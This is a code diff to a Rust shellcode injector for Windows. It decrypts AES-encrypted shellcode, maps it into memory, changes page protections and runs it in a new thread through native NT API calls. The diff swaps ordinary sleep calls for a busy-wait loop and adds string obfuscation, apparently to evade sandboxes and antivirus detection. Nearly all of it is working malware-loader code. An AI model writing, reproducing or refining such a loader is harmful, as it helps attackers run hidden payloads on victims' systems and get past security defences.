@@ -3,9 +3,10 @@ use std::env;
 use aes::{Aes128};
 use cfb_mode::Cfb;
 use cfb_mode::cipher::{NewCipher, AsyncStreamCipher};
-use std::{thread::sleep, time::Duration};
 use windows::{Win32::System::Memory::*, Win32::System::SystemServices::*};
 use ntapi::{ntmmapi::*, ntpsapi::*, ntobapi::*, winapi::ctypes::*};
+use std::time::{Instant};
+use obfstr::obfstr;
 
 type Aes128Cfb = Cfb<Aes128>;
 
@@ -24,14 +25,14 @@ impl Injector {
             let mut map_ptr: *mut c_void = std::ptr::null_mut();
             let mut sc_len = self.shellcode.len() * 5;
             NtAllocateVirtualMemory(NtCurrentProcess, &mut map_ptr, 0, &mut sc_len, MEM_COMMIT.0 | MEM_RESERVE.0, protect);
-            sleep(Duration::from_secs(1));
+            custom_sleep();
             NtProtectVirtualMemory(NtCurrentProcess, &mut map_ptr, &mut sc_len, PAGE_READWRITE.0, &mut protect);
-            sleep(Duration::from_secs(1));
+            custom_sleep();
             std::ptr::copy_nonoverlapping(self.shellcode.as_ptr(), map_ptr as *mut u8, self.shellcode.len());
             NtProtectVirtualMemory(NtCurrentProcess, &mut map_ptr, &mut sc_len, PAGE_NOACCESS.0, &mut protect);
-            sleep(Duration::from_secs(1));
+            custom_sleep();
             NtProtectVirtualMemory(NtCurrentProcess, &mut map_ptr, &mut sc_len, PAGE_EXECUTE.0, &mut protect);
-            sleep(Duration::from_secs(1));
+            custom_sleep();
             let mut thread_handle : *mut c_void = std::ptr::null_mut();
             NtCreateThreadEx(&mut thread_handle, MAXIMUM_ALLOWED, std::ptr::null_mut(), NtCurrentProcess, map_ptr, std::ptr::null_mut(), 0, 0, 0, 0, std::ptr::null_mut());
             NtWaitForSingleObject(thread_handle, 0, std::ptr::null_mut());
@@ -53,6 +54,20 @@ fn decrypt_shellcode_stub() -> Vec<u8> {
     let mut buf = SHELLCODE.to_vec();
     cipher.decrypt(&mut buf);
     buf
+}
+
+fn custom_sleep() {
+    let now = Instant::now();
+    for _ in 0..100 {
+        for _ in 0..100 {
+            for _ in 0..100 {
+                for _ in 0..100 {
+                    print!("");
+                }
+            }
+        }
+    }
+    println!("{} {} {}", obfstr!("el@ps3d:"), now.elapsed().as_millis(), obfstr!("ms."));
 }
 
 fn main() {
